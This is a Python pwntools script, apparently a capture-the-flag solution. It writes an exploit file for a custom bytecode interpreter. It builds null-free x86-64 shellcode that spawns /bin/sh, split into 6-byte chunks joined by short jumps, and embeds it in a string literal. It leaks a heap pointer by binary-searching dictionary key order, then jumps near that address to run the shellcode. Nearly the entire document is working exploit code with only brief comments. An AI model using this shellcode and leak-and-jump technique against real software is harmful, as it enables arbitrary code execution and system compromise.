from pwn import *
from pwnlib import asm

context.arch = 'amd64'

# Create a NOP sled into our code
# (for my laziness)
nop = asm.asm('nop')
# note I did not use asm() here for the jump, to get a short jump
advance = b'\xEB\x06'
nops = (((nop * 6) + advance) * 4)

# ok, so we need to execute everything in 6-byte segments
# which will be a bit odd

# based on: https://www.exploit-db.com/shellcodes/46907

shellcode = nops;

# clear rsi
shellcode += asm.asm('xor rsi, rsi')        # 3 bytes
shellcode += asm.asm('push rsi')            # 1 byte
shellcode += nop * 2                        # 2 bytes
shellcode += advance                        # <advance>

# clear rdi
shellcode += asm.asm('xor rdi, rdi')        # 3 bytes

# we need to get 0x68732f2f6e69622f into rdi
# i'll do this by using rax to shift-and-mask

# clear rax
shellcode += asm.asm('xor rax, rax')        # 3 bytes
shellcode += advance                        # <advance>

shellcode += asm.asm('mov eax, 0x68732f2f') # 5 bytes
shellcode += nop                            # 1 byte
shellcode += advance                        # <advance>

shellcode += asm.asm('shl rax, 32')         # 4 bytes
shellcode += nop * 2                        # 2 bytes
shellcode += advance                        # <advance>

shellcode += asm.asm('or rdi, rax')         # 3 bytes
shellcode += nop * 3                        # 3 bytes
shellcode += advance                        # <advance>

shellcode += asm.asm('mov eax, 0x6e69622f') # 5 bytes
shellcode += nop                            # 1 byte
shellcode += advance                        # <advance>

shellcode += asm.asm('or rdi, rax')         # 3 bytes
shellcode += asm.asm('push rdi')            # 1 byte
shellcode += asm.asm('push rsp')            # 1 byte
shellcode += asm.asm('pop rdi')             # 1 byte
shellcode += advance                        # <advance>

shellcode += asm.asm('push 59')             # 2 bytes
shellcode += asm.asm('pop rax')             # 1 byte
shellcode += asm.asm('cdq')                 # 1 byte
shellcode += asm.asm('syscall')             # 2 bytes

# convert shellcode into a string
s = ""
for byt in shellcode:
    if int(byt) == 0:
        # BAD! nulls will NOT work
        raise "NULL bytes are not allwed"
    # neat trick: convert some of them into chars
    if byt in b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
        s += chr(byt)
    else:
        s += "\\x{0:02x}".format(byt)


# put AT LEAST 8 chars of padding on the end to ensure
# "wide-copy" technique is used for string literal
s += "p_nack//"

prog = """\
LOADS 101 "{shellcode}";

LOADI 0 0;                   # low  = 0
LOADI 1 1152921504606846975; # high = 0x0fffffffffffffff
LOADI 2 0;                   # foundkey = false
LOADI 3 1;                   # true

DICTINIT 100;

LOADS 2 "----------------------------------";
PRINT 2;
LOADS 2 "Leak Guesses";
PRINT 2;
LOADS 2 "----------------------------------";
PRINT 2;
LOADI 2 0;

# 1. insert address to be leaked into dict as a key
SETDICT 101 101 100;

# 2. while (low < high && !foundkey)
WHILELT 0 1

    IFEQ 2 3        # if (foundkey == true)
        MOVE 0 1;   # break
    ELSE

        # guess = (low + high) / 2
        ADD 4 0 1;
        LOADI 5 2;
        DIV 4 4 5;
        PRINT 4;

        # insert guess
        SETDICT 4 4 100;

        # iterate through keys
        LOADI 10 0;        # found_ptr = 0
        LOADI 11 0;        # guess too high
        FORKEY 100 5
            # if (value == guess)
            IFEQ 5 4
                # if already found_ptr, then guess > ptr
                IFEQ 10 3
                    LOADI 11 1;
                ENDIF
            ELSE
                # if (value == pointer)
                IFEQ 5 101
                    LOADI 10 1;
                ENDIF
            ENDIF
        ENDFORKEY

        # generate next guess
        IFEQ 11 3
            # ptr < guess; we guessed too high
            # high = guess
            MOVE 1 4;
        ELSE
            IFEQ 10 3
                # ptr > guess
                # low = guess
                MOVE 0 4;
            ELSE
                # ptr == guess! found it!
                MOVE 2 3;
            ENDIF
        ENDIF
    ENDIF
ENDWHILE

LOADS 2 "----------------------------------";
PRINT 2;
LOADS 2 "Leaked Pointer";
PRINT 2;
LOADS 2 "----------------------------------";
PRINT 2;

# Offset back a bit to hopefully land shellcode
LOADI 2 -10987;
ADD 4 4 2;

JUMPABS 4;

""".format(
    shellcode=s,
)

# construct the file
with open('exploit.bad', mode='w') as fout:
    fout.write(prog)

